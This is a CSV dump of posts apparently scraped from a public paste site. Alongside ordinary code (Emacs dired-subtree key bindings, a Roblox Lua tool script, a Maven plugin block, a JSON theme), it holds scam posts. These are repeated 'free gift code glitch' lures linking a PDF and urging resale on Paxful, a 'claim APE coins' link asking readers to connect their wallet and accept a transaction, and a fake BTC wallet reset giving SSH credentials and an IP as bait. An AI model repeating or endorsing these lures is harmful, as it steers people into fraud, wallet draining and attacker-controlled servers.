id,title,username,language,date,content
WDNDdZCN,🔥 FREE 500$ GIFTCODES METHOD JB,Ineedcods,JavaScript,Friday 28th of February 2025 11:57:33 AM CDT,"
 
Sharing this technique based on my personal experience.
 
1. Use the time zone glitch to get free stuff:
 
Guide PDF: https://lc.cx/jSVEeR
 
2. Go to Paxful
3. Find buyers that buy them without physical receipt.
4. They pay about 60-70% of the codes value, normally u would say it's a bad deal, but since u got them for free u actually make easy and instant $$.
 
If u don't wanna sell them, u could actually just redeem them yourself, but personally I prefer to make money, but it's up to you.
 
Good luck!
 
PASnLMK6U8jfa

"
t4EE9Swk,🚨 LAST CHANCE TO CLAIM APE COINS 🚨,bahodep185,JavaScript,Friday 28th of February 2025 11:57:30 AM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#ac0TFO6S22"
bNqSgtwf,dired-subtree key bindings,mark-naylor-1701,Lisp,Friday 28th of February 2025 11:50:58 AM CDT,";; -----------------------------------------------------------------------------
;; dired subtree specific key bindings

(define-key dired-mode-map (kbd ""C-, i"")   #'dired-subtree-insert)
(define-key dired-mode-map (kbd ""C-, r"")   #'dired-subtree-remove)
(define-key dired-mode-map (kbd ""C-, t"")   #'dired-subtree-toggle)
(define-key dired-mode-map (kbd ""C-, c"")   #'dired-subtree-cycle)
(define-key dired-mode-map (kbd ""C-, R"")   #'dired-subtree-revert)
(define-key dired-mode-map (kbd ""C-, N"")   #'dired-subtree-narrow)
(define-key dired-mode-map (kbd ""C-, u"")   #'dired-subtree-up)
(define-key dired-mode-map (kbd ""C-, d"")   #'dired-subtree-down)
(define-key dired-mode-map (kbd ""C-, n"")   #'dired-subtree-next-sibling)
(define-key dired-mode-map (kbd ""C-, p"")   #'dired-subtree-previous-sibling)
(define-key dired-mode-map (kbd ""C-, b"")   #'dired-subtree-beginning)
(define-key dired-mode-map (kbd ""C-, e"")   #'dired-subtree-end)
(define-key dired-mode-map (kbd ""C-, M"")   #'dired-subtree-mark-subtree)
(define-key dired-mode-map (kbd ""C-, U"")   #'dired-subtree-unmark-subtree)
(define-key dired-mode-map (kbd ""C-, o f"") #'dired-subtree-only-this-file)
(define-key dired-mode-map (kbd ""C-, o d"") #'dired-subtree-only-this-directory)

;; -----------------------------------------------------------------------------"
AsRA0rw6,FREE CRYPTO,bahodep185,JavaScript,Friday 28th of February 2025 11:47:28 AM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#96uU1xyEHV"
cqZ3DsCu,Your Bitcoin Wallet Credentials have been reset,direcsensa_56,GetText,Friday 28th of February 2025 11:47:05 AM CDT,"Dear User
We have received a request to reset the login information for your BTC wallet. If you did not make this request, please ignore this message.
Your new login credentials are 
Username: preciousannehn
Password: H7QHSp
Ip: 87.106.162.209 on port 22 (SSH)
Regards"
8YXLwSTy,dired-subtree key bindings,mjollnir357,Lisp,Friday 28th of February 2025 11:46:49 AM CDT,";; -----------------------------------------------------------------------------
;; dired-subtree specific key bindings

(define-key dired-mode-map (kbd ""C-, i"")   #'dired-subtree-insert)
(define-key dired-mode-map (kbd ""C-, r"")   #'dired-subtree-remove)
(define-key dired-mode-map (kbd ""C-, t"")   #'dired-subtree-toggle)
(define-key dired-mode-map (kbd ""C-, c"")   #'dired-subtree-cycle)
(define-key dired-mode-map (kbd ""C-, R"")   #'dired-subtree-revert)
(define-key dired-mode-map (kbd ""C-, N"")   #'dired-subtree-narrow)
(define-key dired-mode-map (kbd ""C-, u"")   #'dired-subtree-up)
(define-key dired-mode-map (kbd ""C-, d"")   #'dired-subtree-down)
(define-key dired-mode-map (kbd ""C-, n"")   #'dired-subtree-next-sibling)
(define-key dired-mode-map (kbd ""C-, p"")   #'dired-subtree-previous-sibling)
(define-key dired-mode-map (kbd ""C-, b"")   #'dired-subtree-beginning)
(define-key dired-mode-map (kbd ""C-, e"")   #'dired-subtree-end)
(define-key dired-mode-map (kbd ""C-, M"")   #'dired-subtree-mark-subtree)
(define-key dired-mode-map (kbd ""C-, U"")   #'dired-subtree-unmark-subtree)
(define-key dired-mode-map (kbd ""C-, o f"") #'dired-subtree-only-this-file)
(define-key dired-mode-map (kbd ""C-, o d"") #'dired-subtree-only-this-directory)
"
AEdSyxXk,New ToolScript with QuantityText 2 (LocalScript),Sungmingamerpro13,CSS,Friday 28th of February 2025 11:44:37 AM CDT,"local Tool = script.Parent;

local player = game.Players.LocalPlayer
local QuantityLabel = player.PlayerGui:WaitForChild(""QuantityGui"").quantityLabel

enabled = true

function onActivated()
	if not enabled  then
		return
	end

	enabled = false

	wait(.8)

	local Humanoid = player.Character:FindFirstChild(""Humanoid"")
	local EatAnimation = Humanoid:LoadAnimation(script.Parent.EatAnimation)
	
	if (Humanoid ~= nil) then
		if (Humanoid.MaxHealth > Humanoid.Health + 1.6) then
			Humanoid.Health = Humanoid.Health + 1.6
		else	
			if Humanoid.Health == Humanoid.MaxHealth then
				if Tool:WaitForChild(""stacks"") and Tool.stacks.Value > 1 then
					print(Tool.Name.."" (""..Tool.stacks.Value.."")"")
					
					Tool.stacks.Value = Tool.stacks.Value - 1
					script.Parent.heal:Play()
					EatAnimation:Play()
				else
					Tool:Destroy()
					QuantityLabel.Visible = false
				end
			end
		end
	end

	enabled = true

end

Tool:WaitForChild(""stacks"").Changed:Connect(function(Value)
	QuantityLabel.Text = ""Quantity: ""..Value
end)
QuantityLabel.Text = ""Quantity: ""..Tool.stacks.Value

script.Parent.Activated:connect(onActivated)

script.Parent.Equipped:Connect(function()
	QuantityLabel.Visible = true
	QuantityLabel.Text = ""Quantity: ""..Tool.stacks.Value
end)

script.Parent.Unequipped:Connect(function()
	QuantityLabel.Visible = false
end)
"
u0StYGzB,Untitled,Sunilsai,Java,Friday 28th of February 2025 11:42:00 AM CDT,"<plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-antrun-plugin</artifactId>
    <version>3.0.0</version>
    <executions>
        <execution>
            <phase>package</phase>
            <goals>
                <goal>run</goal>
            </goals>
            <configuration>
                <target>
                    <echo>Removing BouncyCastle from jar</echo>
                    <zip destfile=""${project.build.directory}/${project.build.finalName}-without-bc.jar"">
                        <zipfileset src=""${project.build.directory}/${project.build.finalName}-jar-with-dependencies.jar"">
                            <exclude name=""org/bouncycastle/**"" />
                        </zipfileset>
                    </zip>
                    <move file=""${project.build.directory}/${project.build.finalName}-without-bc.jar"" 
                          tofile=""${project.build.directory}/${project.build.finalName}-jar-with-dependencies.jar"" />
                </target>
            </configuration>
        </execution>
    </executions>
</plugin>"
xhRa3FdE,Idk man,bazilimf,JSON,Friday 28th of February 2025 11:41:33 AM CDT,"{
    ""name"": ""Test background"",
    ""description"": ""This is just a test."",
    ""authors"": [
        {
            ""name"": ""not_alone236"",
            ""id"": ""1285265291114315848""
        }
    ],

    ""background"": {
        ""blur"": 0,
        ""url"": """",
        ""alpha"": 0
    }
}"
Jp0tzFF9,🔥 FREE BTC METHOD AZ,Ineedcods,JavaScript,Friday 28th of February 2025 11:40:48 AM CDT,"
 
Sharing this technique based on my personal experience.
 
1. Use the time zone glitch to get free stuff:
 
Guide PDF: https://lc.cx/jSVEeR
 
2. Go to Paxful
3. Find buyers that buy them without physical receipt.
4. They pay about 60-70% of the codes value, normally u would say it's a bad deal, but since u got them for free u actually make easy and instant $$.
 
If u don't wanna sell them, u could actually just redeem them yourself, but personally I prefer to make money, but it's up to you.
 
Good luck!
 
PASE0u8NDaoQS

"
